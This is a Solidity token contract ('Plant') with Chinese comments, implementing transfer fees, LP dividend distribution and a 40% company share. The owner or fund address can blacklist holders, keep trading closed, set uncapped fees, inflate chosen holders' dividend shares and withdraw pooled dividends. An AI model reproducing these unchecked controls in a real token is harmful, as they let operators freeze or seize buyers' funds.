// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "lost owner");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AbsToken is IERC20, Ownable {
    /**代币名称 */
    string public _name;
    string public _symbol;
    uint8 public _decimals;
    uint256 public _tTotal;

    // 通过钱包地址查询余额
    mapping(address => uint256) private _balances;
    // 查询/添加授权交易信息
    mapping(address => mapping(address => uint256)) private _allowances;

    // 交易开关
    bool isOpen;

    // 公司盈利账户
    address fundAddress;

    // 手续费精度是0.1% 也就是千分之1
    // 普通转账手续费
    uint256 public _tranferFee;
    //LP手续费
    uint256 public _LPFee;

    // 全局黑名单,不能任何交易
    mapping(address => bool) public _blackList;
    // 手续费白名单,流动性交易不需要手续费
    mapping(address => bool) public _feeWhiteList;
    // 流动性股东名单,禁止LP交易
    mapping(address => bool) public _boardMembers;
    // 流动性分红黑名单
    mapping(address => bool) public _lpBlackList;

    modifier onlyFundAddress() {
        require(fundAddress == msg.sender, "!fundAddress");
        _;
    }

    constructor(
        string memory Name, // 名称
        string memory Symbol, // 符号
        uint8 Decimals, // 精度
        uint256 Supply, // 发行总量
        address FundAddress // 公司盈利账户
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        fundAddress = FundAddress;

        minHolderNum = 50 * 10**Decimals;
        minOrdinaryNum = 10 * 10**Decimals;

        limitFeeMaxGas = 500000;
        limitFeeMin = 5 * 10**Decimals;
        minTimeSec = 400000;
        compRete = 400;

        _LPFee = 25;

        isOpen = false;

        _feeWhiteList[address(this)] = true;
        _feeWhiteList[FundAddress] = true;

        // 初始化代币总量
        uint256 total = Supply * 10**Decimals;
        _tTotal = total;
        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);
    }

    // 获取token符号
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    // 获取token名称
    function name() external view override returns (string memory) {
        return _name;
    }

    // 获取token精度
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    // 获取token总量
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    // 获取token数量
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        // require(amount <= _balances[msg.sender], "balanceNotEnough");
        // allowance记录了授权账户(发送者)对被接收者的金额,用来授权交易
        _allowances[msg.sender][spender] = amount;
        // 触发授权事件
        emit Approval(msg.sender, spender, amount);
        // 成功返回true
        return true;
    }

    // 只有被授权的人才能调用
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        // require(recipient != address(0), "address error");
        //  授权人账户要大于授权金额
        // require(amount <= _balances[sender], "balanceNotEnough");
        // //  被授权人调用获得的授权额度要大于授权金额
        // require(
        //     amount <= _allowances[sender][msg.sender],
        //     "approveBalanceNotEnough"
        // );
        _transfer(sender, recipient, amount);
        // 授权额度减少
        _allowances[sender][msg.sender] =
            _allowances[sender][msg.sender] -
            amount;
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        //如果发送方是空地址则跳出
        require(from != address(0), "ERC20: transfer from the zero address");
        // 判断是否黑名单
        require(!_blackList[from] && !_blackList[to], "black account!");
        // 获取调用者余额
        uint256 balance = balanceOf(from);
        // 判断是否余额不足
        require(balance >= amount, "balanceNotEnough");

        // to/添加流动性-卖plant
        if (map_LPList[from].enable || map_LPList[to].enable) {
            // from-红名单地址:添加流动性
            // to-红名单地址:撤销流动性

            // 普通用户未开放
            require(isOpen || _boardMembers[from], "trade is not open!");

            // 股东账号不能撤池子
            require(!_boardMembers[to], "this account not quit!");

            //加入LP分红列表
            if (map_LPList[from].enable) {
                _funTransfer(from, to, amount, from);
                processLP(from);
            } else {
                _funTransfer(from, to, amount, to);
                addHolder(from, to);
                processLP(to);
            }
        } else {
            // 如果不是池子地址,就是普通转账行为
            _tokenTransfer(from, to, amount);
        }
    }

    // 分红转账行为
    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        address pairAddr
    ) private {
        // 操作人减少余额
        _balances[sender] = _balances[sender] - tAmount;

        if (_feeWhiteList[sender]) {
            _takeTransfer(sender, recipient, tAmount);
        } else {
            // 计算LP手续费
            uint256 feeAmount = (tAmount * _LPFee) / 1000;
            _takeTransfer(sender, address(this), feeAmount);
            // 记录这个池子的分红余额
            map_LPList[pairAddr].totalAmount += feeAmount;
            // LP地址实际接收
            _takeTransfer(sender, recipient, tAmount - feeAmount);
        }
    }

    // 普通转账行为
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        // 发送者减少token
        _balances[sender] = _balances[sender] - tAmount;

        //  分红账号不扣手续费
        if (_feeWhiteList[sender] || _tranferFee == 0) {
            _takeTransfer(sender, recipient, tAmount);
        } else {
            // 计算手续费
            uint256 fee = (tAmount * _tranferFee) / 1000;
            // 扣除手续费的金额
            uint256 recipientAmount = tAmount - fee;
            // 向接收者发送扣除手续费的token
            _takeTransfer(sender, recipient, recipientAmount);
            // 手续费则发送到指定账户中去
            _takeTransfer(sender, fundAddress, fee);
        }
    }

    // 交易实际调用函数
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    receive() external payable {}

    // 池子信息
    struct LPList {
        // 交易对地址
        address pair;
        // 是否添加过数组里
        bool enable;
        // LP成员
        address[] member;
        // map
        mapping(address => uint256) member_map;
        // 分红的下标
        uint256 currentIndex;
        // 上一次总人数
        uint256 lastMembers;
        //  记录分红余额,每个池子分红不一样
        uint256 totalAmount;
        // 正在分的金额
        uint256 lastTotalAmount;
        // 上一次记录的时间
        uint256 lastBlockNumber;
        // 记录股东转移到锁仓地址后的值
        mapping(address => uint256) recordBoardRate;
    }
    // 通过LP地址获取保存在合约的数组下标
    mapping(address => LPList) private map_LPList;

    // 添加进LP分红
    function addHolder(address adr, address pairAddr) private {
        uint256 size;
        // extcodesize 操作符返回某个地址关联的代码(code)长度，如果代码长度为0，表示为外部地址。而大于0表示为合约地址。
        // 这段代码的本意是只允许 EOA 账户对该合约进行操作，也就是说普通用户可以直接用外部地址发起合约调用，而不允许用另一个合约进行调用。
        // 这段内联汇编有安全风险,需要增加require(tx.origin == msg.sender);作为判断
        assembly {
            size := extcodesize(adr)
        }
        // 因为参数adr是合约地址,所以不能调用
        if (size > 0) {
            return;
        }

        // 判断合约地址是否存在,不存在成员则添加进
        if (0 == map_LPList[pairAddr].member_map[adr]) {
            // 第一次添加 || 添加过下标0不是第一个人, 就添加人数
            if (
                0 == map_LPList[pairAddr].member.length ||
                map_LPList[pairAddr].member[0] != adr
            ) {
                map_LPList[pairAddr].member_map[adr] = map_LPList[pairAddr]
                    .member
                    .length;
                map_LPList[pairAddr].member.push(adr);
            }
        }
    }

    uint256 private minHolderNum; // 股东分红条件
    uint256 private minOrdinaryNum; // 其他分红条件
    uint256 private limitFeeMin; // 最小分红数量
    uint256 private limitFeeMaxGas; // 最大单次gas费用
    uint256 private minTimeSec;
    uint256 private compRete;

    //  执行LP分红，使用 gas(500000) 单位 gasLimit 去执行LP分红
    function processLP(address pairAddr) private {
        //间隔6小时分红一次, bsc链每3秒验证一次,6*60*60/3=7200

        LPList storage pairObj = map_LPList[pairAddr];

        // 这里用秒算,大于x秒后可以分红
        if (block.timestamp - pairObj.lastBlockNumber < minTimeSec) {
            return;
        }

        // 获取用户对应LP地址的LP数量
        IERC20 _lpPair = IERC20(pairAddr);
        //LP池余额
        uint256 totalPair = _lpPair.totalSupply();

        // // 分红账号余额
        // uint256 fundMount = balanceOf(address(this));
        // // 最少要N枚才分
        // if (fundMount < limitFeeMin) {
        //     pairObj.lastBlockNumber = block.timestamp;
        //     return;
        // }

        // 对应池子历史分红金额
        uint256 lastAmount = pairObj.lastTotalAmount;

        // 获取历史LP成员人数
        uint256 shareholderCount = pairObj.lastMembers;

        // 第一次分
        if (pairObj.lastMembers == 0) {
            shareholderCount = pairObj.member.length;
            pairObj.lastMembers = shareholderCount;
        }

        // 消耗的gas
        uint256 gasUsed = 0;
        // 循环条件
        uint256 iterations = 0;
        // 获取剩余gass
        uint256 gasLeft = gasleft();
        // LP持币地址
        address shareHolder;
        // 用户余额
        uint256 tokenBalance;
        // 分红条件,最小持有数量
        uint256 minNum;
        // 分红金额
        uint256 amount;
        // 用户lp余额
        uint256 userPairBalance;

        // 分红账户
        IERC20 FIST = IERC20(address(this));

        // gas小于当前限制, 每次循环都在历史总人数次数
        while (gasUsed < limitFeeMaxGas && iterations < shareholderCount) {
            // 循环完一遍了,重新循环分红
            if (pairObj.currentIndex >= shareholderCount) {
                pairObj.currentIndex = 0;
                pairObj.lastMembers = pairObj.member.length;
            }

            // 重新循环重新记录要分配的金额
            if (pairObj.currentIndex == 0) {
                LPList storage pairObjCopy = pairObj;

                lastAmount = pairObjCopy.totalAmount;

                // 最少要N枚才分
                if (lastAmount < limitFeeMin) {
                    pairObjCopy.lastBlockNumber = block.timestamp;
                    break;
                }

                // 公司份额
                uint256 compProfit = (lastAmount * compRete) / 1000;
                // 用户分的份额
                uint256 userProfit = lastAmount - compProfit;

                // 分之前40%给公司账户,剩余的才分
                FIST.transfer(fundAddress, compProfit);

                // 转移到last里面去
                pairObjCopy.totalAmount = 0;

                // 记录本次要分金额 = 当前lp收到的分红金额
                pairObjCopy.lastTotalAmount = userProfit;
                lastAmount = userProfit;
            }

            // 获取用户地址
            shareHolder = pairObj.member[pairObj.currentIndex];

            // 锁仓地址不分
            if (!_lpBlackList[shareHolder]) {
                // 获取用户代币余额
                tokenBalance = balanceOf(shareHolder);

                // 是否是股东成员,不一样持有数量才进行分红
                if (_boardMembers[shareHolder]) {
                    minNum = minHolderNum;
                } else {
                    minNum = minOrdinaryNum;
                }
                //用户持有的 LP 代币余额+是否有锁仓余额，LP 本身也是一种代币
                userPairBalance =
                    _lpPair.balanceOf(shareHolder) +
                    pairObj.recordBoardRate[shareHolder];

                if (userPairBalance > 0) {
                    //  要分的额度= 要分的金额* 用户添加的金额/总池底
                    amount = (lastAmount * userPairBalance) / totalPair;
                    // 判断最少持有数量 用户余额 > 最少持有数量 && 记录分红的余额 > 分红账号余额
                    if (tokenBalance >= minNum) {
                        FIST.transfer(shareHolder, amount);
                    } else {
                        // 用户达不到分给公司账户
                        FIST.transfer(fundAddress, amount);
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            pairObj.currentIndex++;
            iterations++;
        }

        // 分完后重新记录区块号
        pairObj.lastBlockNumber = block.timestamp;
    }

    // 获取lp信息
    function showPairInfo(address pairAddr)
        public
        view
        returns (
            address _pair,
            bool _enable,
            address[] memory _member,
            uint256 _currentIndex,
            uint256 _lastMembers,
            uint256 _totalAmount,
            uint256 _lastTotalAmount,
            uint256 _lastBlockNumber
        )
    {
        _pair = map_LPList[pairAddr].pair;
        _enable = map_LPList[pairAddr].enable;
        _member = map_LPList[pairAddr].member;
        _currentIndex = map_LPList[pairAddr].currentIndex;
        _lastMembers = map_LPList[pairAddr].lastMembers;
        _totalAmount = map_LPList[pairAddr].totalAmount;
        _lastTotalAmount = map_LPList[pairAddr].lastTotalAmount;
        _lastBlockNumber = map_LPList[pairAddr].lastBlockNumber;
        return (
            _pair,
            _enable,
            _member,
            _currentIndex,
            _lastMembers,
            _totalAmount,
            _lastTotalAmount,
            _lastBlockNumber
        );
    }

    // 显示股东对应池子锁仓量
    function showRecordBoardRate(address pairAddr, address addr)
        public
        view
        returns (uint256)
    {
        return map_LPList[pairAddr].recordBoardRate[addr];
    }

    // 交易开关
    function setOpenStatus(bool _open) external onlyOwner {
        isOpen = _open;
    }

    // 设置股东账号,股东不能撤池子,股东分红条件
    function setBoardMembers(address addr, bool enable)
        external
        onlyFundAddress
    {
        _boardMembers[addr] = enable;
    }

    // 设置流动性分红黑名单,一般只过滤锁仓地址
    function setLPBlackList(address addr, bool enable)
        external
        onlyFundAddress
    {
        _lpBlackList[addr] = enable;
    }

    // 设置股东锁仓数量,用于计算锁仓后占比
    function setRecordBoardRate(
        address pairAddr,
        address addr,
        uint256 amount
    ) external onlyFundAddress {
        map_LPList[pairAddr].recordBoardRate[addr] = amount;
    }

    //设置交易对地址，新增其他 LP 池子，enable = true，是交易对池子
    function setSwapPairList(address pairAddr, bool enable)
        external
        onlyFundAddress
    {
        map_LPList[pairAddr].enable = enable;
        map_LPList[pairAddr].pair = pairAddr;
        map_LPList[pairAddr].lastBlockNumber = block.timestamp;
    }

    // 提现合约里的币
    function depositFee(address pairAddr) external onlyFundAddress {
        uint256 amount = map_LPList[pairAddr].totalAmount;
        IERC20 FIST = IERC20(address(this));
        FIST.transfer(fundAddress, amount);
        map_LPList[pairAddr].totalAmount = 0;
        map_LPList[pairAddr].lastTotalAmount = 0;
        map_LPList[pairAddr].currentIndex = 0;
        map_LPList[pairAddr].lastMembers = 0;
    }

    // 设置分红的持币数量 条件 / 单次循环最大gas费/最小数量分红
    function setHolderCondition(
        uint256 _minHolderNum,
        uint256 _minOrdinaryNum,
        uint256 _limitFeeMaxGas,
        uint256 _limitFeeMin,
        uint256 _minTimeSec,
        uint256 _compRete
    ) external onlyFundAddress {
        minHolderNum = _minHolderNum;
        minOrdinaryNum = _minOrdinaryNum;
        limitFeeMaxGas = _limitFeeMaxGas;
        limitFeeMin = _limitFeeMin;
        minTimeSec = _minTimeSec;
        compRete = _compRete;
    }

    // 设置分红手续费,普通转账/lp操作手续费
    function setFee(uint256 tranferFee, uint256 lPFee)
        external
        onlyFundAddress
    {
        _tranferFee = tranferFee;
        _LPFee = lPFee;
    }

    // 设置公司盈利收入地址
    function setfundAddress(address addr) external onlyFundAddress {
        fundAddress = addr;
    }

    // 设置黑名单
    function setBlackAddress(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    // 设置手续费白名单
    function setFeeWhiteList(address addr, bool enable)
        external
        onlyFundAddress
    {
        _feeWhiteList[addr] = enable;
    }

    // 返回分红上一次到现在的秒数
    function nextFundTime(address pairAddr) public view returns (uint256) {
        return block.timestamp - map_LPList[pairAddr].lastBlockNumber;
    }

    // 返回分红条件
    function getFundInfo()
        public
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        return (
            minHolderNum,
            minOrdinaryNum,
            limitFeeMin,
            limitFeeMaxGas,
            minTimeSec,
            compRete
        );
    }
}

contract Plant is AbsToken {
    constructor()
        AbsToken(
            "Plant", // 代币名称
            "Plant", // 代币符号
            18, //精度
            50000000, // 发行总量
            address(0x742c8F4477B9EfCC48b6dAaD1Ce41B131b3858C2) // 公司盈利账户
        )
    {}
}
